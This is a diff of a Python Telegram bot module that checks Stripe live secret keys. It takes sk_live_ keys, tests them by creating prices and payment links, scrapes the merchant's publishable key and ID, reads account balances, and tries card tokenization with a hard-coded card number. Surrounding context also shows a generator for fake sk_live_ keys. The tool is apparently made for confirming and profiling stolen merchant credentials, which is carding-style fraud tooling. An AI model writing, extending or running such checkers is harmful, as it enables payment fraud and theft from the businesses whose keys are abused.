@@ -5,126 +5,172 @@ import string
 from pyrogram import filters
 from EQUROBOT import app as Checker, BOT_USERNAME
 import time
+import re
+import time
+import requests
+from requests.auth import HTTPBasicAuth
+from pyrogram import Client, filters, enums
 
+#app = Client("my_bot")
 
-def check_sk(key):
-    data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2022&card[cvc]=354'
-    start_time = time.time()
-    first = requests.post('https://api.stripe.com/v1/tokens', data=data, auth=(key, ' '))
-    end_time = time.time()
-    duration = end_time - start_time
-    status = first.status_code
-    f_json = first.json()
+async def retrieve_balance(sk):
+    bln = "https://api.stripe.com/v1/balance"
+    auth = HTTPBasicAuth(sk, '')
+    res = requests.get(bln, auth=auth)
+    return res.json()
 
-    currency = f_json.get('currency', '--')
-    available_balance = f_json.get('available_balance', 'N/A')
-    pending_balance = f_json.get('pending_balance', 'N/A')
+async def retrieve_publishable_key_and_merchant(sk):
+    price_url = "https://api.stripe.com/v1/prices"
+    headers = {"Authorization": f"Bearer {sk}"}
+    price_data = {
+        "currency": "usd",
+        "unit_amount": 1000,
+        "product_data[name]": "Gold Plan"
+    }
+    price_res = requests.post(price_url, headers=headers, data=price_data)
+    
+    if price_res.status_code != 200:
+        price_error = price_res.json().get('error', {})
+        error_code = price_error.get('code', '')
+        error_message = price_error.get('message', '')
+        error_type = price_error.get('type', 'error')
 
-    if 'error' in f_json:
-        type = f_json['error'].get('type', '')
-    else:
-        type = ''
-
-    if status == 200 or type == 'card_error':
-        r_text, r_logo, r_respo = 'LIVE KEY ✅', '✅', 'LIVE KEY'
-    else:
-        if 'error' in f_json:
-            r_res = f_json['error'].get('code', 'INVALID API KEY').replace('_', ' ').strip()
-        else:
-            r_res = 'INVALID API KEY'
-        r_text, r_logo, r_respo = 'SK KEY DEAD ❌', '❌', r_res
-
-    return r_text, r_logo, r_respo, currency, available_balance, pending_balance, duration
-
-
-@Checker.on_message(filters.command("sk"))
-async def sk_checker(_, message):
-    if message.reply_to_message and message.reply_to_message.document:
-        document = await message.reply_to_message.download()
-        with open(document, 'r') as file:
-            keys = [line.strip() for line in file.readlines()]
-    else:
-        data = message.text.split(maxsplit=1)
-        if len(data) < 2 or not data[1].startswith('sk_live_'):
-            return await message.reply("**ɢɪᴠᴇ ᴍᴇ sᴇɴsᴇɪ ᴏɴʟʏ sᴋ ᴋᴇʏ ᴏᴛʜᴇʀ ᴡɪsᴇ ɪ ᴄᴀɴ ɴᴏᴛ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴋᴇʏ.**")
+        if error_code == 'api_key_expired' or error_message.startswith('Invalid API Key provided'):
+            raise Exception(f"{error_code}: {error_message}")
         
-        keys = [data[1]]
+        raise Exception(f"{error_type}: {error_message}")
 
-    total_keys = len(keys)
-    hits = 0
-    dead = 0
-    total_checked = 0
-    secret_key = "sktxt_7264426371_CIDX48AO"  # You might want to generate this dynamically
+    price_id = price_res.json()["id"]
 
-    response_text = f"""
-⊗ 𝐆𝐚𝐭𝐞: MassTxT SK Checker
+    payment_link_url = "https://api.stripe.com/v1/payment_links"
+    payment_link_data = {
+        "line_items[0][quantity]": 1,
+        "line_items[0][price]": price_id
+    }
+    payment_link_res = requests.post(payment_link_url, headers=headers, data=payment_link_data)
+    if payment_link_res.status_code != 200:
+        payment_link_error = payment_link_res.json().get('error', {})
+        error_code = payment_link_error.get('code', '')
+        error_message = payment_link_error.get('message', '')
+        
+        if error_code == 'payment_link_no_valid_payment_methods':
+            return None, None
+        
+        raise Exception(f"Failed to create payment link: {payment_link_res.text}")
 
-⊗ 𝐓𝐨𝐭𝐚𝐥 𝐒𝐊 𝐈𝐧𝐩𝐮𝐭: {total_keys}
-⊗ 𝐇𝐢𝐭𝐬: {hits}
-⊗ 𝐃𝐞𝐚𝐝: {dead}
-⊗ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {total_checked}
-( total checked status will be updated after 100 sk checked done . this is for telegram limitation of message.edit )
-⊗ 𝐒𝐞𝐜𝐫𝐞𝐭 𝐊𝐞𝐲: {secret_key}
-(𝐆𝐞𝐭 𝐘𝐨𝐮𝐫 𝐇𝐢𝐭𝐬 𝐊𝐞𝐲 𝐁𝐲 /gethits {secret_key} )
-⊗ 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠
+    payment_link = payment_link_res.json()["url"]
+    payment_link_id = payment_link.split("/")[-1]
 
-⊗ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:  𝗂𝗍'𝗌°᭄ 𝗆𝖾 ࿐
-"""
+    merchant_ui_api_url = f"https://merchant-ui-api.stripe.com/payment-links/{payment_link_id}"
+    merchant_res = requests.get(merchant_ui_api_url)
+    if merchant_res.status_code != 200:
+        raise Exception(f"Failed to retrieve publishable key and merchant: {merchant_res.text}")
+    merchant_data = merchant_res.json()
+    publishable_key = merchant_data.get("key")
+    merchant = merchant_data.get("merchant")
 
-    sent_message = await message.reply(response_text)
+    return publishable_key, merchant
 
-    live_keys = []
+async def check_status(message, sk, user_id):
+    tic = time.perf_counter()
 
-    for key in keys:
-        if not key.startswith('sk_live_'):
-            dead += 1
-            continue
-
-        r_text, r_logo, r_respo, currency, available_balance, pending_balance, duration = check_sk(key)
-
-        if r_text == 'LIVE KEY ✅':
-            hits += 1
-            live_keys.append(key)
+    try:
+        publishable_key, merchant = await retrieve_publishable_key_and_merchant(sk)
+    except Exception as e:
+        error_message = str(e)
+        if 'api_key_expired' in error_message:
+            r_text = "𝗔𝗣𝗜 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ❌"
+            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
+            publishable_key, merchant = None, None
+        elif 'Invalid API Key provided' in error_message:
+            r_text = "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗣𝗜 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
+            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
+            publishable_key, merchant = None, None
+        elif 'payment_link_no_valid_payment_methods' in error_message:
+            r_text = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
+            r_warning = '𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌'
+            publishable_key, merchant = None, None
         else:
-            dead += 1
+            publishable_key, merchant = None, None
 
-        total_checked += 1
-
-        if total_checked % 100 == 0 or total_checked == total_keys:
-            response_text = f"""
-⊗ 𝐆𝐚𝐭𝐞: MassTxT SK Checker
-
-⊗ 𝐓𝐨𝐭𝐚𝐥 𝐒𝐊 𝐈𝐧𝐩𝐮𝐭: {total_keys}
-⊗ 𝐇𝐢𝐭𝐬: {hits}
-⊗ 𝐃𝐞𝐚𝐝: {dead}
-⊗ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {total_checked}
-( total checked status will be updated after 100 sk checked done . this is for telegram limitation of message.edit )
-⊗ 𝐒𝐞𝐜𝐫𝐞𝐭 𝐊𝐞𝐲: {secret_key}
-(𝐆𝐞𝐭 𝐘𝐨𝐮𝐫 𝐇𝐢𝐭𝐬 𝐊𝐞𝐲 𝐁𝐲 /gethits {secret_key} )
-⊗ 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠
-
-⊗ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:  𝗂𝗍'𝗌°᭄ 𝗆𝖾 ࿐
+    bal_dt = await retrieve_balance(sk)
+    try:
+        avl_bln = bal_dt['available'][0]['amount'] / 100
+        pnd_bln = bal_dt['pending'][0]['amount'] / 100
+        crn = bal_dt['available'][0]['currency']
+    except KeyError:
+        txtx = f"""
+[ϟ] 𝗦𝗞 ➜
+<code>{sk}</code>
+[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : 𝗗𝗲𝗮𝗱 𝗞𝗲𝘆 ❌
+[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ <a href="tg://user?id={user_id}">{message.from_user.first_name}</a>
 """
-            await sent_message.edit(response_text)
+        return txtx
 
-    response_text = f"""
-⊗ 𝐆𝐚𝐭𝐞: MassTxT SK Checker
+    if publishable_key and merchant:
+        chk = "https://api.stripe.com/v1/payment_methods"
+        data = f'type=card&card[number]=5425430190132501&card[exp_month]=12&card[exp_year]=2027&card[cvc]=963&key={publishable_key}&_stripe_account={merchant}'
+        rep = requests.post(chk, data=data)
+        repp = rep.text
 
-⊗ 𝐓𝐨𝐭𝐚𝐥 𝐒𝐊 𝐈𝐧𝐩𝐮𝐭: {total_keys}
-⊗ 𝐇𝐢𝐭𝐬: {hits}
-⊗ 𝐃𝐞𝐚𝐝: {dead}
-⊗ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {total_checked}
-⊗ 𝐒𝐞𝐜𝐫𝐞𝐭 𝐊𝐞𝐲: {secret_key}
-(𝐆𝐞𝐭 𝐘𝐨𝐮𝐫 𝐇𝐢𝐭𝐬 𝐊𝐞𝐲 𝐁𝐲 /gethits {secret_key} )
-⊗ 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐃𝐨𝐧𝐞
+        if 'rate_limit' in repp:
+            r_text = '𝗥𝗔𝗧𝗘 𝗟𝗜𝗠𝗜𝗧⚠️'
+            r_warning = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
+        elif 'pm_' in repp:
+            r_text = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
+            r_warning = '𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅'
+        elif 'Invalid API Key provided' in repp:
+            r_text = "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗣𝗜 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
+            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
+        elif 'You did not provide an API key.' in repp:
+            r_text = "𝗡𝗢 𝗦𝗞 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌"
+            r_warning = '𝗡𝗢 𝗦𝗞 𝗞𝗘𝗬 𝗣𝗥𝗢𝗩𝗜𝗗𝗘𝗗 ❌'
+        elif 'testmode_charges_only' in repp or 'test_mode_live_card' in repp:
+            r_text = "𝗧𝗘𝗦𝗧 𝗠𝗢𝗗𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝗢𝗡𝗟𝗬 ❌"
+            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
+        elif 'api_key_expired' in repp:
+            r_text = "𝗔𝗣𝗜 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ❌"
+            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
+        else:
+            r_text = "𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌"
+            r_warning = '𝗦𝗞 𝗞𝗘𝗬 𝗗𝗘𝗔𝗗 ❌'
+    else:
+        r_text = "𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌"
+        r_warning = '𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌'
 
-⊗ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲:  𝗂𝗍'𝗌°᭄ 𝗆𝖾 ࿐
+    toc = time.perf_counter()
+
+    txtxtx = f"""
+{r_warning}
+
+[ϟ] 𝗦𝗞 ➜ 
+<code>{sk}</code>
+[ϟ] 𝗣𝘂𝗯𝗹𝗶𝘀𝗵𝗮𝗯𝗹𝗲 𝗞𝗲𝘆 : <code>{publishable_key if publishable_key else 'Not Available'}</code>
+[ϟ] 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : <code>{merchant if merchant else 'Not Available'}</code>
+[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {r_text}
+[ϟ] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 : <b>{crn}</b>
+[ϟ] 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : <b>{avl_bln}$</b>
+[ϟ] 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : <b>{pnd_bln}$</b>
+[ϟ] 𝗧𝗶𝗺𝗲 𝗧𝗼𝗼𝗸 : <b><code>{toc - tic:.2f}</code> Seconds</b>
+
+[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ➜ <a href="tg://user?id={user_id}">{message.from_user.first_name}</a>
 """
-    await sent_message.edit(response_text)
 
-    if hits > 0:
-        live_keys_message = "\n".join(live_keys)
-        await message.reply(f"Here are your live keys:\n\n{live_keys_message}")
+    return txtxtx
+
+@app.on_message(filters.command("sk", prefixes="."))
+async def sk_checker(client, message):
+    ttt = message.text
+    skm = re.search(r"sk_live_[a-zA-Z0-9]+", ttt)
+    if not skm:
+        await message.reply("Please provide a valid secret key.")
+        return
+
+    sk = skm.group(0)
+    user_id = message.from_user.id
+    response = await check_status(message, sk, user_id)
+    await message.reply(response, parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)
+
 
 
 def generate_stripe_secret_key(prefix='sk_live_', middle_length=65, suffix_length=21):
